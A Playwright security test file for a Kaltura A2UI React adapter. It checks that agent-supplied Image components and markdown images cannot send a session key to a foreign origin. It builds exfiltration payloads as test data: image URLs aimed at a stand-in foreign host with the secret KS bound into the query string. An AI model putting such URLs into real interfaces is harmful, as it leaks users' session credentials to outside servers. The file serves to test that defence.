// Covers: SEC-05 (plan item 3.1). The basic Image in buildKalturaCatalog sends
// no request to a foreign origin, also when an agent binds the KS into its url
// with formatString. A Kaltura CDN image still loads. The same holds for an
// image in basic Text markdown, and when the host also registers basicCatalog.
// The harness page loads the web component bundle only, so this spec builds a
// small A2UI surface page from the React adapter source.
import { build } from 'vite';
import { fileURLToPath } from 'node:url';
import { test, expect } from './fixtures/harness';
import { ORIGIN_A, ORIGIN_B } from './fixtures/constants';

const KS = 'E2E_SECRET_KS_NOT_REAL';
const KALTURA_IMG = 'https://cfvod.kaltura.com/p/1/thumbnail/entry_id/0_abc/width/200';
const PAGE = `${ORIGIN_A}/media-policy/page.html`;
const ENTRY = 'virtual-media-policy-entry';
const adapter = fileURLToPath(new URL('../src/adapters/react/index.ts', import.meta.url));
// 1x1 transparent PNG
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');

let bundle = '';

test.beforeAll(async () => {
  const result = await build({
    configFile: false,
    logLevel: 'silent',
    define: { 'process.env.NODE_ENV': '"production"' },
    plugins: [
      {
        name: 'media-policy-entry',
        // Vite may hand the lib entry over as an absolute path.
        resolveId: id => (id.endsWith(ENTRY) ? `\0${ENTRY}` : null),
        load: id =>
          id === `\0${ENTRY}`
            ? `import { createElement } from 'react';
import { createRoot } from 'react-dom/client';
import { MessageProcessor } from '@a2ui/web_core/v0_9';
import { A2uiSurface, MarkdownContext, basicCatalog } from '@a2ui/react/v0_9';
import { renderMarkdown } from '@a2ui/markdown-it';
import { buildKalturaCatalog, setErrorHandler } from ${JSON.stringify(adapter)};
window.__reports = [];
setErrorHandler(e => window.__reports.push(e));
// pickBasic: the host also registers basicCatalog and the agent picks it.
window.__render = (components, dataModel, pickBasic) => {
  const catalog = buildKalturaCatalog();
  const processor = new MessageProcessor(pickBasic ? [catalog, basicCatalog] : [catalog]);
  processor.processMessages([
    { version: 'v0.9', createSurface: { surfaceId: 's', catalogId: pickBasic ? basicCatalog.id : catalog.id } },
    { version: 'v0.9', updateDataModel: { surfaceId: 's', path: '/', value: dataModel } },
    { version: 'v0.9', updateComponents: { surfaceId: 's', components } },
  ]);
  const surface = createElement(A2uiSurface, { surface: processor.model.getSurface('s') });
  const root = document.getElementById('host').appendChild(document.createElement('div'));
  createRoot(root).render(createElement(MarkdownContext.Provider, { value: renderMarkdown }, surface));
};`
            : null,
      },
    ],
    build: { write: false, minify: false, lib: { entry: ENTRY, formats: ['iife'], name: 'MediaPolicy', fileName: () => 'bundle.js' } },
  });
  const outputs = (Array.isArray(result) ? result : [result]).flatMap(r => ('output' in r ? r.output : []));
  const chunk = outputs.find(o => o.type === 'chunk');
  if (!chunk || chunk.type !== 'chunk') throw new Error('test bundle has no chunk');
  bundle = chunk.code;
});

test('SEC-05: a basic Image sends nothing to a foreign origin, a bound KS included', async ({ harness: h }) => {
  const { page } = h;
  const foreign = `${ORIGIN_B}/${h.token}/img.png`;
  await page.route(/^https:\/\/[^/]*\.kaltura\.com\//, route =>
    route.fulfill({ status: 200, contentType: 'image/png', headers: { 'Access-Control-Allow-Origin': '*' }, body: PNG }),
  );
  await page.route(`${ORIGIN_A}/media-policy/**`, route =>
    route.request().url().endsWith('/bundle.js')
      ? route.fulfill({ contentType: 'text/javascript', body: bundle })
      : route.fulfill({ contentType: 'text/html', body: '<!doctype html><main id="host"></main><script src="bundle.js"></script>' }),
  );
  await page.goto(PAGE);
  await page.evaluate(
    ([foreignUrl, kalturaUrl, ks]) =>
      (window as unknown as { __render(c: unknown[], d: unknown): void }).__render(
        [
          { id: 'root', component: 'Column', children: ['plain', 'bound', 'kaltura'] },
          { id: 'plain', component: 'Image', url: foreignUrl },
          {
            id: 'bound',
            component: 'Image',
            url: { call: 'formatString', args: { value: `${foreignUrl}?k=\${/session/ks}` }, returnType: 'string' },
          },
          { id: 'kaltura', component: 'Image', url: kalturaUrl },
        ],
        { session: { ks } },
      ),
    [foreign, KALTURA_IMG, KS] as const,
  );
  await expect(page.locator(`#host img[src="${KALTURA_IMG}"]`)).toHaveCount(1);
  await h.settle();

  expect(await page.locator('#host img').count()).toBe(1);
  expect(await h.serverLog('B')).toEqual([]);
  expect(h.requests.filter(u => u.startsWith(ORIGIN_B) || u.includes(KS))).toEqual([]);
  expect(h.requests).toContain(KALTURA_IMG);
  const reports = await page.evaluate(() => (window as unknown as { __reports: unknown[] }).__reports);
  expect(reports).toEqual([
    { code: 'url-rejected', widget: 'image', message: 'Image url is not allowed' },
    { code: 'url-rejected', widget: 'image', message: 'Image url is not allowed' },
  ]);
  expect(h.pageErrors).toEqual([]);
});

test('SEC-05: markdown images and a host that also registers basicCatalog send nothing out', async ({ harness: h }) => {
  const { page } = h;
  const foreign = `${ORIGIN_B}/${h.token}/img.png`;
  await page.route(/^https:\/\/[^/]*\.kaltura\.com\//, route =>
    route.fulfill({ status: 200, contentType: 'image/png', headers: { 'Access-Control-Allow-Origin': '*' }, body: PNG }),
  );
  await page.route(`${ORIGIN_A}/media-policy/**`, route =>
    route.request().url().endsWith('/bundle.js')
      ? route.fulfill({ contentType: 'text/javascript', body: bundle })
      : route.fulfill({ contentType: 'text/html', body: '<!doctype html><main id="host"></main><script src="bundle.js"></script>' }),
  );
  await page.goto(PAGE);
  await page.evaluate(
    ([foreignUrl, kalturaUrl, ks]) => {
      const render = (window as unknown as { __render(c: unknown[], d: unknown, pickBasic?: boolean): void }).__render;
      const markdown = { call: 'formatString', args: { value: `**md** ![x](${foreignUrl}?d=\${/session/ks})` }, returnType: 'string' };
      const components = [
        { id: 'root', component: 'Column', children: ['text', 'image', 'kaltura'] },
        { id: 'text', component: 'Text', text: markdown },
        { id: 'image', component: 'Image', url: foreignUrl },
        { id: 'kaltura', component: 'Image', url: kalturaUrl },
      ];
      render(components, { session: { ks } });
      render(components, { session: { ks } }, true);
    },
    [foreign, KALTURA_IMG, KS] as const,
  );
  await expect(page.locator(`#host img[src="${KALTURA_IMG}"]`)).toHaveCount(2);
  await expect(page.locator('#host strong')).toHaveCount(2);
  await h.settle();

  expect(await page.locator('#host img').count()).toBe(2);
  expect(await h.serverLog('B')).toEqual([]);
  expect(h.requests.filter(u => u.startsWith(ORIGIN_B) || u.includes(KS))).toEqual([]);
  expect(h.pageErrors).toEqual([]);
});
